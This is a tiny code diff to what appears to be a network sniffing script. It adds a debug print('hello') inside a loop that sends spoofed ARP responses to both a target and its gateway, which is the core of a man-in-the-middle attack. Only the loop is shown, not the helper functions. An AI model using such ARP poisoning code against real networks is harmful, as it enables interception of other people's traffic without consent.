@@ -29,6 +29,7 @@ def SingleSniffing(targetip):
 		try:
 			print("Sending spoofed ARP responses")
 			while True:
+				print("hello")
 				spoofarpcache(targetip, targetmac, gatewayip)
 				spoofarpcache(gatewayip, gatewaymac, targetip)
 		except KeyboardInterrupt:
